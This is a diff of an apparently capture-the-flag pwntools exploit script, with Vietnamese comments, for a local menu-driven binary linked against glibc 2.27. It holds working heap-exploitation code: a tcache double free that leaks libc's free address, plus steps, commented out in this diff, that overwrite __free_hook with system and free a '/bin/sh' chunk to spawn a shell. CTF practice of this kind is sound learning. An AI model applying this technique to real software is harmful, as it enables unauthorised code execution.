@@ -8,9 +8,9 @@ ld = ELF("./ld-2.27.so")
 
 r = process(exe.path)
 
-#gdb.attach(r, gdbscript='''
-#vis
-#''')
+gdb.attach(r, gdbscript='''
+vis
+''')
            
 def newAdmin():
     r.sendlineafter(b'Choice: ', b'1')
@@ -37,7 +37,17 @@ def deleteAdmin():
 def deleteUser():
     r.sendlineafter(b'Choice: ', b'7')
 
+### Ý tưởng 1 ###
+#newUser(b'AuDuc')
+#deleteUser()
+#newAdmin()
 
+#getFlag = 0x40084a
+#editStudent(p64(0) + p64(getFlag))
+#print(printAdmin())
+#####
+
+### Ý tưởng 2###
 newUser(b'AuDuc')
 deleteUser()
 deleteUser()
@@ -53,21 +63,21 @@ print('free leak: ', hex(free_addr))
 libc.address = free_addr - libc.sym['free']
 print('Libc base: ', hex(libc.address))
 
-editStudent(p64(libc.sym['free']))
+#editStudent(p64(libc.sym['free']))
 
-deleteAdmin()
+#deleteAdmin()
 
-newUser(b'A'*8)
-deleteUser()
-deleteUser()
+#newUser(b'A'*8)
+#deleteUser()
+#deleteUser()
 
-editStudent(p64(libc.sym['__free_hook']))
+#editStudent(p64(libc.sym['__free_hook']))
 
-newUser(b'A'*8)
-newUser(p64(libc.sym['system']))
+#newUser(b'A'*8)
+#newUser(p64(libc.sym['system']))
 
-newUser(b'/bin/sh\x00')
+#newUser(b'/bin/sh\x00')
 
-deleteUser()
+#deleteUser()
 
 r.interactive()
